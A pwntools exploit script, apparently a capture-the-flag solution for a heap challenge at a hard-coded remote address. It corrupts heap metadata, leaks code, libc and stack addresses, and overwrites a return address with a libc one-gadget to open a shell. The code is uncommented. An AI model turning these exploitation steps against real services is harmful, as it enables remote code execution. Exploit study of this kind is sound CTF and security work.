#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
host = "10.211.55.19"
port = 8888
host = "111.186.63.209"
port = 6666
context.arch = "amd64"    
r = remote(host,port)

def add(size,content,num):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)
    r.recvuntil(":")
    r.sendline(str(num))

def show(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def update(idx,content,num,line=None):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    time.sleep(0.1)
    r.recvuntil(":")
    if line :
        r.sendline(content)
    else :
        r.send(content)
    r.recvuntil(":")
    r.sendline(str(num))

def free(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def secret(magic):
    r.recvuntil(":")
    r.sendline("666")
    r.recvuntil(":")
    r.sendline(str(magic))


add(0x10,"bbbbbbb",-1)
update(0,"bbbbbbbb",-2)
secret(0xc047fff8004)
update(0,"a"*17 ,0x0000ffffffffffff,1)
add(0x10,"ggwp",-3)
update(0,"a"*18,0x0000ffffffffffff)
update(0,"a"*0x18,0x0000013000004000)
update(0,"a"*0xf,0x02ffffff00000002,1)
free(0)
add(0x10,p64(0x602000000018)[:7],-1)
show(0)
r.recvuntil("Content: ")
cfi = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00"))
code = cfi - 0x114ab0
stroul_got = code + 0x0000000000347f20
print hex(cfi)
update(2,p8(0x1),0x0000ffffffffffff,1)
update(2,"aa",-2)
update(2,p64(stroul_got),0,1)
show(0)
r.recvuntil("Content: ")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x45140
print hex(libc)
argv = libc + 0x3ee098
update(2,p64(argv)[:7],cfi<<16)
show(0)
r.recvuntil("Content: ")
stack = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00"))
ret = stack - 0x118 + 8 - 0x40
fuck = ret + 0x48
print hex(ret)
malloc_hook = libc + 0x3ebc30
update(2,p64(ret)[:6],cfi<<8,1)
magic= libc + 0x4f322
gets = libc + 0x800b0
updatefunc = code + 0x114a1e
r.recvuntil(":")
r.sendline("3")
r.recvuntil(":")
r.sendline("0")
r.recvuntil("Content: ")
r.sendline(p64(updatefunc)[:6])
ret2 = ret - 0x40
update(2,p64(ret2)[:6],cfi<<8,1)
r.recvuntil(":")
r.sendline("3")
r.recvuntil(":")
r.sendline("0")
r.recvuntil("Content: ")
r.sendline(p64(magic)[:6])

r.interactive()
